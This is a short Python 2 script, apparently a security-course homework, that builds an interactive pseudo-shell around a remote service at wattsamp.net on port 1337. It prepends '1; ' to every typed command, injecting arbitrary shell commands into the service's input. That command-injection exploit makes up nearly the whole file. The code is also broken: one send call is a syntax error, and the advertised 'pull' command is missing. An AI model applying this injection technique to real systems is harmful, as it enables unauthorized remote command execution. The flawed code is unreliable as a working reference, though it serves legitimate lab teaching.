"""
	Use the same techniques such as (but not limited to):
	1) Sockets
	2) File I/O
	3) raw_input()

	from the OSINT HW to complete this assignment. Good luck!
"""

import socket
import time

host = "wattsamp.net" # IP address here
port = 1337 # Port here

global_prompt = "> "
dir = ""

def execute_cmd(cmd, prompt):
	"""
		Sockets: https://docs.python.org/3/library/socket.html
		How to use the socket s:

		# Establish socket connection
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((host, port))

		Reading:

			data = s.recv(1024)     # Receives 1024 bytes from IP/Port
			print(data)             # Prints data

		Sending:

 			s.send("something to send\n")   # Send a newline \n at the end of your command
	"""
	global global_prompt

	if cmd == "help":

		print("shell, pull <remote-path> <local-path>, help, quit, exit")
	elif cmd == "shell":

		exit = 0

		temp = global_prompt

		global_prompt = "/" + global_prompt

		while exit == 0:

			inner_cmd = raw_input(global_prompt)

			#print("\n")

			if inner_cmd == ("exit"):

				exit = 1
			elif inner_cmd == ("quit"):

				exit = 1
			else:

				execute_cmd(("1; " + inner_cmd), global_prompt)

			#print("\n")

		global_prompt = temp

	else:

		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((host, port))

		time.sleep(1)


		data = s.recv(1024)


		s.send(cmd "\n")

		time.sleep(1)

		data = s.recv(1024)
		print(data)


if __name__ == '__main__':

	global global_prompt

	exit = 0

	while exit == 0:

		cmd = raw_input(global_prompt)

		#print("\n")

		if cmd == ("exit"):

			exit = 1
		elif cmd == ("quit"):

			exit = 1
		else:

			execute_cmd(("1; " + cmd), global_prompt)

		#print("\n")
